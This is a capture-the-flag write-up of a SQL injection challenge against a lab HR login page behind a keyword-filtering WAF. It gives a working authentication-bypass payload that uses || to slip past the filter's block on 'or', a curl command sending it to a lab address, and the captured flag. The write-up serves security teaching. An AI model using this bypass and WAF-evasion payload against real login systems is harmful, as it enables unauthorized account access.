<img width="421" height="485" alt="Screenshot 2026-07-12 080158" src="https://github.com/user-attachments/assets/b51bc8e1-98ad-4e1f-ad85-d3b96474e3ee" />
<h3>Step 1: Recon the Page</h3>

<p>
Opening the site reveals a fake HR login page (Trilocor) with a GET form taking a username and password to <code>index.php</code>. The headers give a hint of a Web Application Firewall (WAF): <code>X-HR-Filter: SecureQuery-1.2</code>. This indicates a classic login SQLi, but with a filter in front.
</p>

<h3>Step 2: Confirm SQL Injection</h3>

<p>
Trying a normal fail, and then breaking the query with a single quote:
</p>

<pre>
?username=admin&password=admin
→ Invalid username or password.

?username=admin'&password=x
→ HR-DB-500 + DEBUG SQL error (MariaDB)
</pre>

<p>
The debug line reveals the query shape:
</p>

<pre>... username = '$username' AND password = MD5('$password') LIMIT 1</pre>

<p>
This tells us that the username is concatenated raw, the password is hashed with MD5() before being compared, and the database is MariaDB/MySQL.
</p>

<h3>Step 3: Map What the WAF Blocks</h3>

<p>
Probing keywords reveals how the filter responds:
</p>

<table border="1" style="border-collapse: collapse; width: 100%; text-align: left;">
    <tr>
        <th style="padding: 8px;">Response</th>
        <th style="padding: 8px;">Meaning</th>
    </tr>
    <tr>
        <td style="padding: 8px;">Request rejected by HR security policy</td>
        <td style="padding: 8px;">Filter caught it</td>
    </tr>
    <tr>
        <td style="padding: 8px;">Invalid username or password</td>
        <td style="padding: 8px;">Reached DB, no match</td>
    </tr>
    <tr>
        <td style="padding: 8px;">HR-DB-500 / DEBUG</td>
        <td style="padding: 8px;">Reached DB, broken SQL</td>
    </tr>
    <tr>
        <td style="padding: 8px;">Timeout / empty</td>
        <td style="padding: 8px;">Often throttle / heavy block</td>
    </tr>
</table>

<p>
The WAF blocks things like <code>or</code> / <code>OR</code> as a <em>substring</em> (e.g., <code>administrator</code> gets blocked), as well as <code>--</code>, <code>union</code>, <code>select</code>, <code>password</code>, and spaces. However, <code>||</code> (MySQL’s alternative for OR) slips through. 
</p>

<h3>Step 4: The Logic Trick (Password Bypass)</h3>

<p>
Since <code>--</code> (comment) is blocked, we must make the username part of the query evaluate to true for a real user without needing the password. Because of MySQL operator precedence, AND binds tighter than OR / <code>||</code>.
</p>

<p><b>Payload:</b></p>
<pre>username=admin'||''=&password=x</pre>

<p>This transforms the query into:</p>
<pre>username = 'admin'||''='' AND password = MD5('x')</pre>

<p>Which is parsed by the database as:</p>
<pre>(username = 'admin') OR ('' = '' AND password = MD5('x'))</pre>

<p>
The right side evaluates to false, but the left side is true if the <code>admin</code> user exists. The row matches without knowing the password, and <code>||</code> successfully bypasses the WAF's block on the word "or".
</p>

<h3>Step 5: Log in and Grab the Flag</h3>

<p>
Using curl to follow redirects and store cookies, we can inject the URL-encoded payload (<code>%27</code> for ', <code>%7C%7C</code> for ||, <code>%3D</code> for =):
</p>

<pre>
curl -sS -L -c cookies.txt -b cookies.txt \
"http://10.5.14.225:30026/index.php?username=admin%27%7C%7C%27%27%3D%27&password=x"
</pre>

<p>
This results in a 302 redirect to <code>dashboard.php</code>, where the flag is waiting in the HTML.
</p>

<h3>Recovered Flag</h3>

<pre>OPUCC{6ed0c8cf921ee12f5a4488f329bbd8d7}</pre>
